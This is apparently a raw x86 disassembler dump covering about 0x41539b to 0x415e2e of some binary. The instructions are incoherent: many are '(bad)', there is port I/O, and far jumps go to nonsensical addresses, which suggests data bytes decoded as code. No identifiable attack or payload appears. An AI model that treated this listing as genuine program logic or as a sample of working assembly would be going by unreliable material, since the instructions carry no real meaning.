  41539b:	fadd   QWORD PTR [ebp+0x3af7bfc0]
  4153a1:	cmp    al,0x57
  4153a3:	sub    BYTE PTR [ebp-0x1f8e394b],bl
  4153a9:	es jns 0x415411
  4153ac:	(bad)  
  4153ae:	jmp    0x4153c5
  4153b0:	mov    ch,0x4e
  4153b2:	and    ebp,DWORD PTR [ecx+0x304eb0b6]
  4153b8:	sahf   
  4153b9:	push   ss
  4153ba:	pushf  
  4153bb:	in     al,dx
  4153bc:	ret    0x7ec0
  4153bf:	xor    al,BYTE PTR gs:[edi+0x74]
  4153c3:	aad    0xdb
  4153c5:	push   ss
  4153c6:	iret   
  4153c7:	ins    BYTE PTR es:[edi],dx
  4153c8:	retf   
  4153c9:	stos   DWORD PTR es:[edi],eax
  4153ca:	and    BYTE PTR [edx],ah
  4153cc:	mov    WORD PTR [ecx],gs
  4153ce:	in     al,0x2f
  4153d0:	lock inc eax
  4153d2:	int    0xb5
  4153d4:	lea    eax,[edi-0x6808576b]
  4153da:	aaa    
  4153db:	int3   
  4153dc:	loope  0x4153e0
  4153de:	sti    
  4153df:	push   ecx
  4153e0:	jp     0x41543d
  4153e2:	jp     0x4153ed
  4153e4:	fdiv   QWORD PTR [ebx]
  4153e6:	xor    ah,0x58
  4153e9:	aam    0x8d
  4153eb:	shl    DWORD PTR [esi+0x0],1
	...
  415455:	add    BYTE PTR [ebp-0x10],ch
  415458:	repz jmp FWORD PTR cs:[edi]
  41545c:	std    
  41545d:	repz mov edi,0xecd3e5b0
  415463:	pop    ebx
  415464:	leave  
  415465:	dec    eax
  415466:	pop    ecx
  415467:	in     eax,0x0
  415469:	add    bh,bh
  41546b:	add    BYTE PTR [eax],al
  41546d:	add    ah,bl
  41546f:	sahf   
  415470:	adc    ebp,DWORD PTR [eax+0x67]
  415473:	cmp    DWORD PTR [edx],0x70d75a75
  415479:	test   BYTE PTR [edi],dl
  41547b:	daa    
  41547c:	fcom   DWORD PTR [ebp+ecx*1-0x5f4cce84]
  415483:	arpl   sp,dx
  415485:	ret    
  415486:	add    eax,edx
  415488:	and    bh,ch
  41548a:	push   ecx
  41548b:	out    0xef,eax
  41548d:	add    DWORD PTR [edx+0x11],edi
  415490:	cmc    
  415491:	cmp    eax,0x8f308621
  415496:	or     al,0xcd
  415498:	out    0xa5,al
  41549a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41549b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41549c:	sub    eax,DWORD PTR [ebp+0x20]
  41549f:	jp     0x4154b6
  4154a1:	fiadd  WORD PTR [edx-0x7519be7f]
  4154a7:	mov    bh,0xb2
  4154a9:	fiadd  WORD PTR [edi+0x5]
  4154ac:	pop    esi
  4154ad:	popa   
  4154ae:	mov    ebx,0x1557d84c
  4154b3:	retf   
  4154b4:	xor    ebp,edx
  4154b6:	and    al,0x26
  4154b8:	fisubr WORD PTR [edx-0x7d]
  4154bb:	mov    esi,0x363c9844
  4154c0:	imul   BYTE PTR [ecx]
  4154c2:	xor    DWORD PTR [eax-0x75720e41],esp
  4154c8:	sub    BYTE PTR [esi+0x7328081f],dh
  4154ce:	push   0xc66697a4
  4154d3:	aas    
  4154d4:	into   
  4154d5:	sbb    bl,BYTE PTR [ecx]
  4154d7:	inc    esp
  4154d8:	retf   
  4154d9:	add    BYTE PTR [ecx],ch
  4154db:	sub    BYTE PTR [ecx+0x5b],ch
  4154de:	inc    ecx
  4154df:	test   al,0x1
  4154e1:	pop    edx
  4154e2:	pushf  
  4154e3:	enter  0x140f,0x64
  4154e7:	sbb    ch,al
  4154e9:	lahf   
  4154ea:	sbb    BYTE PTR [esi],bh
  4154ec:	std    
  4154ed:	test   DWORD PTR [ecx],esp
  4154ef:	mov    WORD PTR [ebx],ds
  4154f1:	mov    al,0xdd
  4154f3:	mov    ah,0xc
  4154f5:	and    DWORD PTR [edi-0x7ae72d27],esp
  4154fb:	ss out dx,eax
  4154fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154fe:	fld    DWORD PTR fs:[esi]
  415501:	sub    eax,DWORD PTR [edi+0x6ebbbf57]
  415507:	mov    dh,0x6c
  415509:	mov    bl,0x1f
  41550b:	add    bl,BYTE PTR [edi]
  41550d:	jecxz  0x415583
  41550f:	xchg   esi,eax
  415510:	dec    esi
  415512:	sub    eax,0xed8346aa
  415517:	xor    al,0x1d
  415519:	cmc    
  41551a:	mov    ch,0x38
  41551c:	xchg   ecx,eax
  41551d:	inc    ecx
  41551e:	sbb    al,0xd3
  415520:	cld    
  415521:	stc    
  415522:	setnp  BYTE PTR [ebp+0x7f9bc9c7]
  415529:	in     al,0x5b
  41552b:	leave  
  41552c:	sbb    al,0xec
  41552e:	xor    dh,BYTE PTR [edi-0x72]
  415531:	mov    al,BYTE PTR [esp+ebx*1]
  415534:	adc    al,0x64
  415536:	loope  0x4154f4
  415538:	push   cs
  415539:	retf   
  41553a:	sub    eax,0xf9e697e0
  41553f:	xor    DWORD PTR [ebx],0xfffffff1
  415542:	out    0xef,eax
  415544:	fsub   QWORD PTR [ebp-0x4a]
  415547:	pop    ss
  415548:	pop    ebp
  415549:	in     eax,dx
  41554a:	mov    dh,0x35
  41554c:	aam    0x32
  41554e:	jmp    0xb9f60464
  415553:	adc    al,0x30
  415555:	aam    0xfe
  415557:	inc    eax
  415558:	ja     0x415520
  41555a:	neg    ecx
  41555c:	stos   BYTE PTR es:[edi],al
  41555d:	adc    al,0xdd
  41555f:	mov    ebx,0xc30c0a43
  415564:	mov    ch,0x7c
  415566:	sub    BYTE PTR [edx+eiz*2-0x4c4394e3],dl
	...
  4155d5:	add    ah,ah
  4155d7:	lock sub DWORD PTR [edx],ecx
  4155da:	cmp    eax,0xa2fee7db
  4155df:	arpl   WORD PTR [ebx],bp
  4155e1:	je     0x415568
  4155e3:	xchg   BYTE PTR [ebx+0xe65829],ah
  4155e9:	add    bh,bh
  4155eb:	add    BYTE PTR [eax],al
  4155ed:	add    ah,dl
  4155ef:	mov    edi,0xacefe7c5
  4155f4:	or     eax,0xf4435647
  4155f9:	push   esi
  4155fa:	cmp    eax,0xa40881e4
  4155ff:	out    dx,al
  415600:	int    0xb6
  415602:	dec    edi
  415603:	cmp    ebx,DWORD PTR [ecx]
  415605:	repnz mov edx,0x2af10a75
  41560b:	adc    ebp,ecx
  41560d:	jb     0x4155c1
  41560f:	hlt    
  415610:	xor    BYTE PTR [ecx-0x3e],0x24
  415614:	in     eax,dx
  415615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415616:	dec    ebp
  415617:	fistp  WORD PTR [eax+0x659a695e]
  41561d:	test   BYTE PTR [esi-0x71],0xfa
  415621:	inc    ebp
  415622:	push   ecx
  415623:	inc    ebx
  415624:	adc    ch,ah
  415626:	jmp    0x415661
  415628:	push   edx
  415629:	adc    edx,esp
  41562b:	lods   al,BYTE PTR ds:[esi]
  41562c:	test   al,0x4
  41562e:	jnp    0x41565f
  415630:	(bad)  
  415631:	int3   
  415632:	xchg   ebp,eax
  415633:	jne    0x4155d2
  415635:	xchg   ebx,eax
  415636:	jmp    0xbdc35900
  41563b:	push   0xc7203040
  415640:	fbld   TBYTE PTR [eax+0x6e]
  415643:	xor    ebx,DWORD PTR [edi+0x7d]
  415646:	pop    ecx
  415647:	xor    eax,0xd143ddd
  41564c:	ds cmc 
  41564e:	(bad)  
  41564f:	fnstenv [ecx]
  415651:	sti    
  415652:	cs or  al,0xbc
  415655:	int3   
  415656:	and    BYTE PTR [edx],al
  415658:	and    DWORD PTR [edi],ebp
  41565a:	(bad)  
  41565b:	sub    al,0x8f
  41565d:	adc    edi,edx
  41565f:	mov    eax,ds:0x6c7084ee
  415664:	cmp    DWORD PTR [eax],esp
  415666:	fsubr  st(0),st
  415668:	or     al,0x10
  41566a:	leave  
  41566b:	fbld   TBYTE PTR [edx]
  41566d:	fs adc eax,0xd20b6aa7
  415673:	cmc    
  415674:	nop
  415675:	jae    0x41569c
  415677:	adc    cl,dh
  415679:	inc    ebx
  41567a:	cld    
  41567b:	imul   esi,DWORD PTR [edx+ebx*2-0x15],0x6697899f
  415683:	dec    eax
  415684:	cmp    eax,DWORD PTR [eax]
  415686:	retf   
  415687:	sbb    DWORD PTR [ecx],0xffffffea
  41568a:	mov    al,ds:0xd9f4f05a
  41568f:	push   eax
  415690:	and    al,0xcf
  415692:	mov    bh,0xc8
  415694:	je     0x415693
  415696:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415697:	xchg   ch,dh
  415699:	std    
  41569a:	mov    esi,0xeb86f8f4
  41569f:	int3   
  4156a0:	call   DWORD PTR [edi]
  4156a2:	pop    ds
  4156a3:	cmp    eax,0x493c25f
  4156a8:	adc    eax,esi
  4156aa:	loopne 0x4156f5
  4156ac:	push   edx
  4156ad:	loope  0x4156cb
  4156af:	push   esi
  4156b0:	cmp    BYTE PTR [edx+0x5d13d7d6],0x50
  4156b7:	cwde   
  4156b8:	dec    BYTE PTR [esi]
  4156ba:	rcl    BYTE PTR [esi+0x7926e86d],1
  4156c0:	mov    edx,0xd8668e76
  4156c5:	jg     0x4156c4
  4156c7:	jbe    0x41573b
  4156c9:	mov    ds:0x4fbbad9e,eax
  4156ce:	test   DWORD PTR [ebx+0x72],esi
  4156d1:	pop    esp
  4156d2:	fisttp DWORD PTR [ecx-0xa38284b]
  4156d8:	or     ebp,esi
  4156da:	sbb    edx,DWORD PTR [ebx+0x52]
  4156dd:	mov    al,ds:0xb1a85aa7
  4156e2:	addr16 (bad) 
  4156e4:	or     eax,0xb38d7667
  4156e9:	push   edx
  4156ea:	repnz arpl WORD PTR [esi+0x0],ax
	...
  415755:	add    BYTE PTR [ebp-0x66],ch
  415758:	mov    esp,0xfd67ff45
  41575d:	mov    edx,0x2c46bab3
  415762:	xchg   edi,eax
  415763:	adc    al,0x31
  415765:	pop    esp
  415766:	push   edi
  415767:	out    0x0,eax
  415769:	add    bh,bh
  41576b:	add    BYTE PTR [eax],al
  41576d:	add    BYTE PTR [esi+0x349cd3f8],bl
  415773:	mov    al,ds:0xb933c3f2
  415778:	ret    0x1947
  41577b:	inc    edx
  41577c:	or     al,0x32
  41577e:	mov    dl,cl
  415780:	pop    ds
  415781:	inc    BYTE PTR [eax+0x2e]
  415784:	neg    ebx
  415786:	cli    
  415787:	inc    esp
  415788:	cmp    ebx,DWORD PTR [eax+0x7633a8fb]
  41578e:	pop    ebx
  41578f:	out    dx,al
  415790:	mov    esi,0xd6c4cb4f
  415795:	sub    eax,0xa9db42a
  41579a:	adc    ah,BYTE PTR [ebx]
  41579c:	lock js 0x415774
  41579f:	mov    dh,0xe0
  4157a1:	sub    al,0x8b
  4157a3:	mov    dl,0x2a
  4157a5:	(bad)  
  4157a6:	sbb    eax,DWORD PTR [eax-0x5dd18f80]
  4157ac:	retf   0x531b
  4157af:	mov    esi,0x6cf553c
  4157b4:	leave  
  4157b5:	into   
  4157b6:	mov    al,0x9b
  4157b8:	pop    ds
  4157b9:	scas   eax,DWORD PTR es:[edi]
  4157ba:	fbld   TBYTE PTR [edi+ecx*1-0xe]
  4157be:	pusha  
  4157bf:	pop    esp
  4157c0:	std    
  4157c1:	adc    ch,BYTE PTR [ebp+0x776531d]
  4157c7:	mov    ss,WORD PTR [esi-0x1a8f23cb]
  4157cd:	inc    esp
  4157ce:	cmp    eax,0x9f668269
  4157d3:	scas   al,BYTE PTR es:[edi]
  4157d4:	hlt    
  4157d5:	xchg   esp,eax
  4157d6:	or     dl,0xec
  4157d9:	scas   al,BYTE PTR es:[edi]
  4157da:	and    eax,0x6b2e1764
  4157df:	fs cmp ecx,ebp
  4157e2:	dec    edx
  4157e3:	pusha  
  4157e4:	dec    edx
  4157e5:	sbb    bl,BYTE PTR [eax+0x20]
  4157e8:	cmc    
  4157e9:	ja     0x41585a
  4157eb:	iret   
  4157ec:	mov    edx,0xcea765f7
  4157f1:	or     al,0x57
  4157f3:	pushf  
  4157f4:	(bad)  
  4157f5:	sti    
  4157f6:	test   DWORD PTR [ebp+esi*2-0x5c1aab79],0x6e0c7d9c
  415801:	fld    DWORD PTR [esi+0x2c]
  415804:	(bad)  
  415805:	cmp    DWORD PTR es:[eax],edx
  415808:	adc    al,0x47
  41580a:	ret    
  41580b:	ret    0xf031
  41580e:	push   ebx
  41580f:	inc    eax
  415810:	out    0x24,al
  415812:	lods   al,BYTE PTR ds:[esi]
  415813:	hlt    
  415814:	push   0x5e
  415816:	loopne 0x415850
  415818:	push   ss
  415819:	aam    0xd2
  41581b:	mov    dh,0x8e
  41581d:	cmp    cl,0x43
  415820:	cwde   
  415821:	push   ss
  415822:	test   BYTE PTR [ebx],0xff
  415825:	jge    0x4157fc
  415827:	sbb    bh,BYTE PTR [edi+0x48]
  41582a:	adc    ebp,edi
  41582c:	push   0x460d8951
  415831:	add    al,0x8e
  415833:	cdq    
  415834:	fs (bad) 
  415836:	in     al,dx
  415837:	jle    0x4158b0
  415839:	test   DWORD PTR [esi+edx*1],ecx
  41583c:	sub    bh,bl
  41583e:	sub    eax,DWORD PTR [edi-0x3f]
  415841:	mov    ds:0x5c8dd1ba,al
  415846:	int    0xe5
  415848:	pushf  
  415849:	arpl   si,cx
  41584b:	pop    ebx
  41584c:	mov    ch,0x0
  41584e:	jo     0x4158a3
  415850:	mov    esi,0x2042069b
  415855:	adc    eax,0xc3fcc81c
  41585a:	mov    dl,0x85
  41585c:	ret    0x2a9c
  41585f:	std    
  415860:	mov    eax,0xeb5c98d0
  415865:	nop
  415866:	inc    eax
  415867:	adc    BYTE PTR [edx],cl
  415869:	pop    esi
  41586a:	fucomp st(2)
  41586c:	dec    ebp
	...
  4158d5:	add    bl,cl
  4158d7:	(bad)  
  4158d8:	xchg   ebx,eax
  4158d9:	in     al,dx
  4158da:	mov    bh,0xed
  4158dc:	(bad)  
  4158dd:	inc    DWORD PTR [edi]
  4158df:	(bad)  
  4158e1:	shr    DWORD PTR [eax],cl
  4158e3:	outs   dx,BYTE PTR ds:[esi]
  4158e4:	xchg   edx,eax
  4158e5:	adc    eax,0xe856
  4158ea:	inc    DWORD PTR [eax]
  4158ec:	add    BYTE PTR [eax],al
  4158ee:	sahf   
  4158ef:	pop    esp
  4158f0:	mov    ch,0x2c
  4158f2:	adc    al,0x77
  4158f4:	add    eax,ebx
  4158f6:	jecxz  0x41590c
  4158f8:	lahf   
  4158f9:	inc    ecx
  4158fa:	arpl   WORD PTR [eax],cx
  4158fc:	and    al,0xb1
  4158fe:	pop    ecx
  4158ff:	dec    ebx
  415900:	rcl    BYTE PTR [ebx-0x25],1
  415903:	(bad)  
  415904:	mov    edx,0x347e4dac
  415909:	add    DWORD PTR [edi+0x5d],0x1c
  41590d:	popa   
  41590e:	jmp    0x4158f9
  415910:	xor    ecx,DWORD PTR [eax-0x43]
  415913:	lds    edi,FWORD PTR [esi]
  415915:	outs   dx,BYTE PTR ds:[esi]
  415916:	add    eax,0xbc58f33
  41591b:	xchg   ebp,eax
  41591c:	fisttp DWORD PTR [ebp-0x38]
  41591f:	cmc    
  415920:	jge    0x41591d
  415922:	mov    ebp,0xffb5f833
  415927:	fsub   QWORD PTR [esi+edx*2-0x1af2b924]
  41592e:	call   0x1a241c4f
  415933:	cld    
  415934:	out    0xb9,al
  415936:	mov    DWORD PTR [edx-0x3a],ecx
  415939:	(bad)  
  41593a:	clc    
  41593b:	stc    
  41593c:	jae    0x415946
  41593e:	in     eax,0x57
  415940:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415941:	inc    ebx
  415942:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  415944:	push   cs
  415945:	mov    bh,BYTE PTR [ecx+0x3]
  415948:	sbb    dh,dh
  41594a:	sub    al,0x88
  41594c:	adc    DWORD PTR [ebx+0x6c],esi
  41594f:	jle    0x41598e
  415951:	or     BYTE PTR [ebx-0x40b768f7],dh
  415957:	nop
  415958:	fistp  WORD PTR ds:0x13e60e5f
  41595e:	jle    0x415981
  415960:	and    BYTE PTR [edx],0xfd
  415963:	push   esp
  415964:	retf   0xb91a
  415967:	pop    esp
  415968:	lods   eax,DWORD PTR ds:[esi]
  415969:	sti    
  41596a:	xor    BYTE PTR [ecx],al
  41596c:	and    ebx,esi
  41596e:	into   
  41596f:	sar    dl,cl
  415971:	in     al,0x97
  415973:	pop    edi
  415974:	dec    ebp
  415975:	xchg   esp,eax
  415976:	rcl    BYTE PTR [edx-0x335474e0],1
  41597c:	mov    al,ds:0x5a3bf890
  415981:	scas   al,BYTE PTR es:[edi]
  415982:	outs   dx,DWORD PTR ds:[esi]
  415983:	jb     0x4159d9
  415985:	fpatan 
  415987:	loope  0x4159ca
  415989:	repz rcr DWORD PTR [esi+ebx*1-0x5a5a5f1e],cl
  415991:	push   eax
  415992:	xlat   BYTE PTR ds:[ebx]
  415993:	(bad)  
  415994:	scas   al,BYTE PTR es:[edi]
  415995:	adc    ah,al
  415997:	mul    DWORD PTR [edi-0x45]
  41599a:	aam    0x4e
  41599c:	add    al,0x2b
  41599e:	rcl    DWORD PTR ds:0x5386cdd7,cl
  4159a4:	mov    eax,0x8f9c287
  4159a9:	sbb    DWORD PTR [edx],0xc1c6317c
  4159af:	push   edi
  4159b0:	shr    al,0xdc
  4159b3:	or     al,0xe
  4159b5:	(bad)  
  4159b6:	xor    eax,0x8ab46eb9
  4159bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159bc:	hlt    
  4159bd:	adc    dl,BYTE PTR [eax-0x2b]
  4159c0:	dec    ecx
  4159c1:	(bad)  
  4159c2:	or     BYTE PTR [ecx-0x16],ch
  4159c5:	xlat   BYTE PTR ds:[ebx]
  4159c6:	mov    edx,0x888be9f4
  4159cb:	pop    ss
  4159cc:	push   edi
  4159cd:	mov    ecx,0x2f805c95
  4159d2:	xchg   edi,eax
  4159d3:	mov    eax,ds:0x1bb39995
  4159d8:	adc    DWORD PTR [edx-0x3c],ecx
  4159db:	jne    0x4159a0
  4159dd:	out    dx,eax
  4159de:	jle    0x415a08
  4159e0:	inc    edi
  4159e1:	fild   WORD PTR [ebp-0x24e5b06a]
  4159e7:	push   0xa68a9a0b
  4159ec:	sbb    eax,0x0
	...
  415a55:	add    BYTE PTR [ebp-0x78],al
  415a58:	sub    al,0x77
  415a5a:	in     eax,dx
  415a5b:	neg    DWORD PTR [edi-0x46]
  415a5e:	sub    edi,DWORD PTR [edi-0x10]
  415a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a62:	out    dx,eax
  415a63:	iret   
  415a64:	xor    DWORD PTR [ebp+0x55],ebx
  415a67:	jmp    0x1405a6c
  415a6c:	add    BYTE PTR [eax],al
  415a6e:	nop
  415a6f:	ds scas al,BYTE PTR es:[edi]
  415a71:	jl     0x415a60
  415a73:	mov    bl,BYTE PTR [esi+0x37]
  415a76:	std    
  415a77:	dec    esp
  415a78:	and    edi,DWORD PTR [edx-0x74]
  415a7b:	ins    BYTE PTR es:[edi],dx
  415a7c:	and    esi,DWORD PTR [edi+0x1ec00abf]
  415a82:	and    BYTE PTR [ecx-0x1a],0x18
  415a86:	pop    edx
  415a87:	sub    esi,DWORD PTR [eax+ebx*8-0x62]
  415a8b:	sbb    edi,0x2
  415a8e:	pop    ecx
  415a8f:	jae    0x415a85
  415a91:	sahf   
  415a92:	test   al,0x3
  415a94:	bndldx (bad),[edi+0x36ef7f89]
  415a9b:	push   edx
  415a9c:	in     eax,0x57
  415a9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a9f:	mov    ch,0x58
  415aa1:	mov    esi,0x97e005dd
  415aa6:	jbe    0x415aab
  415aa8:	in     al,dx
  415aa9:	push   esi
  415aaa:	pusha  
  415aab:	add    al,0xde
  415aad:	inc    ecx
  415aae:	mov    dl,0xca
  415ab0:	jge    0x415ad1
  415ab2:	loop   0x415acf
  415ab4:	jmp    0xee4d:0xe300ba1f
  415abb:	or     BYTE PTR [ebx+0x5f],dh
  415abe:	add    eax,0x25112178
  415ac3:	add    eax,0x6abb7d42
  415ac8:	outs   dx,BYTE PTR ds:[esi]
  415ac9:	iret   
  415aca:	imul   ebx,edi,0xf47542fa
  415ad0:	test   al,0x93
  415ad3:	jge    0x415a76
  415ad5:	int    0xa0
  415ad7:	int    0x91
  415ad9:	push   0x55
  415adb:	loopne 0x415b19
  415add:	sub    DWORD PTR [edi],edx
  415adf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ae0:	and    esi,DWORD PTR [edi]
  415ae2:	adc    esp,ebp
  415ae4:	das    
  415ae5:	pushf  
  415ae6:	fdivp  st(0),st
  415ae8:	js     0x415af1
  415aea:	xchg   BYTE PTR [ecx],ch
  415aec:	push   ebp
  415aed:	add    al,0xe0
  415aef:	xchg   esi,eax
  415af0:	call   0x78fd:0xee744ef5
  415af7:	mov    ebp,DWORD PTR [ecx]
  415af9:	fadd   DWORD PTR [ebp+0xf8f1709]
  415aff:	sub    edx,DWORD PTR [eax+0x1758f10b]
  415b05:	(bad)  
  415b06:	out    0x19,eax
  415b08:	in     eax,dx
  415b09:	xor    ecx,DWORD PTR ss:0x245e5b66
  415b10:	adc    al,0xa8
  415b12:	sub    eax,DWORD PTR [edx+0x5f057bb5]
  415b18:	inc    BYTE PTR [edi+0xd893a]
  415b1e:	xchg   esi,eax
  415b1f:	push   ss
  415b20:	mov    eax,ecx
  415b22:	ss dec esp
  415b24:	mov    bh,0xe
  415b26:	test   eax,0xa890fa4b
  415b2b:	mov    cl,0x65
  415b2d:	retf   0x3e03
  415b30:	sbb    BYTE PTR [edi+0x7e],bl
  415b33:	xchg   edi,eax
  415b34:	mov    eax,ds:0xd08856ca
  415b39:	lock inc esi
  415b3b:	loop   0x415b49
  415b3d:	stos   DWORD PTR es:[edi],eax
  415b3e:	out    dx,al
  415b3f:	or     ebx,DWORD PTR [ebp+0x20259154]
  415b45:	jp     0x415b4f
  415b47:	jo     0x415ba6
  415b49:	dec    ebx
  415b4a:	inc    ebp
  415b4b:	scas   eax,DWORD PTR es:[edi]
  415b4c:	(bad)
  415b4f:	fs out dx,eax
  415b51:	dec    ebp
  415b52:	ds inc esi
  415b54:	mul    al
  415b56:	jne    0x415b7f
  415b58:	jb     0x415b36
  415b5a:	or     DWORD PTR [ecx],ebx
  415b5c:	mov    DWORD PTR [edx],edx
  415b5e:	les    ecx,FWORD PTR [eax-0x331a5822]
  415b64:	int    0xaf
  415b66:	pop    es
  415b67:	pop    ebx
  415b68:	stc    
  415b69:	jo     0x415bc0
  415b6b:	push   ebp
  415b6c:	adc    BYTE PTR [eax],al
	...
  415bd6:	fistp  QWORD PTR [esi-0x449a6dfb]
  415bdc:	(bad)  
  415bde:	stc    
  415bdf:	dec    ebp
  415be0:	push   ss
  415be1:	fdiv   st(6),st
  415be3:	push   es
  415be4:	sbb    eax,0xea5420
  415be9:	add    bh,bh
  415beb:	add    BYTE PTR [eax],al
  415bed:	add    BYTE PTR [ebx+0x21d518d4],bh
  415bf3:	xchg   DWORD PTR [ebx+0x31b886ff],edi
  415bf9:	xchg   esi,eax
  415bfa:	or     al,0x61
  415bfc:	add    al,0xac
  415bfe:	cwde   
  415bff:	dec    edi
  415c00:	or     eax,0x98260484
  415c05:	adc    al,BYTE PTR gs:[ecx+ecx*4-0xb]
  415c0a:	sbb    dl,cl
  415c0c:	fstp   st(1)
  415c0e:	jge    0x415c1c
  415c10:	adc    BYTE PTR [ecx+0x66],ch
  415c13:	mov    ch,0x8c
  415c15:	jl     0x415bd5
  415c17:	add    eax,0x555a0932
  415c1c:	or     al,0xa8
  415c1e:	in     al,dx
  415c1f:	js     0x415bc5
  415c21:	fimul  WORD PTR [esi+0x44]
  415c24:	pop    es
  415c25:	jmp    0x415ca0
  415c27:	mov    ds:0x57928572,al
  415c2c:	ret    
  415c2d:	shl    DWORD PTR [esi],0xe3
  415c30:	inc    edi
  415c31:	cmp    DWORD PTR [edi],ebp
  415c33:	fcom   QWORD PTR [eax+edi*1+0x436992db]
  415c3a:	inc    esi
  415c3b:	sub    al,dh
  415c3d:	push   esp
  415c3e:	addr16 cmp al,0x71
  415c41:	add    al,0xfa
  415c43:	stos   BYTE PTR es:[edi],al
  415c44:	pop    es
  415c45:	test   eax,0xf905087d
  415c4a:	dec    edi
  415c4b:	fimul  WORD PTR [eax-0x3555a7c1]
  415c51:	fisubr WORD PTR [edx-0x55f991e7]
  415c57:	and    BYTE PTR [esi+ebx*1+0x38],0xc
  415c5c:	dec    ecx
  415c5d:	(bad)  
  415c5e:	repnz sub al,0xbe
  415c61:	cmp    DWORD PTR [edi],edx
  415c63:	pop    ds
  415c64:	shr    DWORD PTR [edx+0x1bea769d],cl
  415c6a:	xchg   ecx,eax
  415c6b:	push   0x1f18efa
  415c70:	fist   WORD PTR [ebx]
  415c72:	test   dl,0x6c
  415c75:	daa    
  415c76:	mov    edx,0x67df3841
  415c7b:	mov    esi,0xd1bd4726
  415c80:	cmc    
  415c81:	dec    ecx
  415c82:	(bad)  
  415c84:	call   0x8ffc:0xa9474a0b
  415c8b:	fldenv [eax]
  415c8d:	adc    ch,BYTE PTR [eax-0xb]
  415c90:	dec    ecx
  415c91:	push   ecx
  415c92:	jne    0x415c72
  415c94:	sbb    DWORD PTR [edx+0x18ca6ab5],edi
  415c9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c9b:	cmp    ch,cl
  415c9d:	cli    
  415c9e:	sub    edi,DWORD PTR [edx-0x2d]
  415ca1:	xchg   esi,eax
  415ca2:	jmp    0x976d:0xe3efc665
  415ca9:	add    DWORD PTR [edx-0x37e0e3e5],ebx
  415caf:	jo     0x415c33
  415cb1:	ins    DWORD PTR es:[edi],dx
  415cb2:	sub    BYTE PTR ds:0x702091f0,cl
  415cb8:	lods   eax,DWORD PTR ds:[esi]
  415cb9:	std    
  415cba:	iret   
  415cbb:	add    edx,DWORD PTR [ebp-0x2f69f18]
  415cc1:	jae    0x415cf4
  415cc3:	pushf  
  415cc4:	js     0x415cb6
  415cc6:	xchg   esp,eax
  415cc7:	(bad)  
  415cc8:	mov    dl,0xae
  415cca:	mov    dh,0xb8
  415ccc:	xchg   esp,eax
  415ccd:	add    dl,BYTE PTR [ecx]
  415ccf:	mov    esi,0x1b94fdf3
  415cd4:	and    eax,0xdd996a73
  415cd9:	lds    edx,FWORD PTR [ebp+eiz*4-0x19e9c41e]
  415ce0:	enter  0xfe3a,0x79
  415ce4:	shl    dl,1
  415ce6:	and    al,BYTE PTR [esi]
  415ce8:	add    ch,bl
  415cea:	mov    dh,0x1d
  415cec:	and    DWORD PTR [eax],eax
	...
  415d56:	cmp    dl,BYTE PTR [eax]
  415d58:	mov    edi,0xbbbfbf3c
  415d5d:	push   ss
  415d5e:	push   esp
  415d5f:	push   ecx
  415d60:	mov    esi,0x82648d1f
  415d65:	ret    0xeb53
  415d68:	add    BYTE PTR [eax],al
  415d6a:	inc    DWORD PTR [eax]
  415d6c:	add    BYTE PTR [eax],al
  415d6e:	sbb    dl,BYTE PTR [esi]
  415d70:	push   esi
  415d71:	ret    0x1f68
  415d74:	shr    BYTE PTR [eax-0x28],0x85
  415d78:	(bad)  [eax+0x1453fed4]
  415d7e:	into   
  415d7f:	in     eax,dx
  415d80:	lahf   
  415d81:	adc    ecx,DWORD PTR ds:0x608b91e
  415d87:	call   0xb6c1:0x8ca2b13
  415d8e:	aad    0x25
  415d90:	(bad)  [edi-0x59]
  415d93:	mov    ebx,0x73b9cf75
  415d98:	push   esi
  415d99:	jbe    0x415d6d
  415d9b:	retf   
  415d9c:	in     eax,dx
  415d9d:	cwde   
  415d9e:	outs   dx,BYTE PTR ds:[esi]
  415d9f:	xor    al,BYTE PTR [edi]
  415da1:	pop    ebp
  415da2:	jge    0x415db7
  415da4:	cdq    
  415da5:	mov    ch,0xd
  415da7:	xor    eax,0xd8cc6c77
  415dac:	jns    0x415dc0
  415dae:	cdq    
  415daf:	ins    BYTE PTR es:[edi],dx
  415db0:	inc    eax
  415db1:	neg    ah
  415db3:	mov    ch,0xc
  415db5:	push   es
  415db6:	add    edi,DWORD PTR [ecx]
  415db8:	push   esp
  415db9:	fs pop esp
  415dbb:	jns    0x415dca
  415dbd:	jmp    0x6e03:0xeaab46d4
  415dc4:	mov    eax,0x1a09ec22
  415dc9:	sahf   
  415dca:	call   0xc3b2a374
  415dcf:	pop    es
  415dd0:	and    ebp,ecx
  415dd2:	cmp    BYTE PTR [eax-0x2564300],ch
  415dd8:	mov    ds:0xfb7c74cd,eax
  415ddd:	add    eax,0xc7d41513
  415de2:	aam    0x3d
  415de4:	cwde   
  415de5:	dec    esi
  415de6:	dec    ebx
  415de7:	sbb    DWORD PTR [ebx+0x3d],edi
  415dea:	mov    cl,0x39
  415dec:	loope  0x415de0
  415dee:	mov    ds:0xbf6dcd15,al
  415df3:	daa    
  415df4:	ror    bh,cl
  415df6:	dec    ecx
  415df7:	mov    esp,0xce4f9731
  415dfc:	dec    ecx
  415dfd:	or     eax,DWORD PTR [eax-0x6f0a2a0]
  415e03:	jno    0x415dea
  415e05:	(bad)  
  415e07:	das    
  415e08:	pop    ebp
  415e09:	sti    
  415e0a:	jb     0x415da4
  415e0c:	outs   dx,BYTE PTR ds:[esi]
  415e0d:	mov    ebx,0x974e387a
  415e12:	add    ah,BYTE PTR [esi-0x24]
  415e15:	or     DWORD PTR [esi+0x78692ca8],0x1b3a6d70
  415e1f:	rcl    BYTE PTR ds:0xd6f8d442,1
  415e25:	push   cs
  415e26:	xor    esp,0x1475bac7
  415e2c:	lods   eax,DWORD PTR ds:[esi]
  415e2d:	(bad)  
  415e2e:	cmp    BYTE PTR [esi],ch
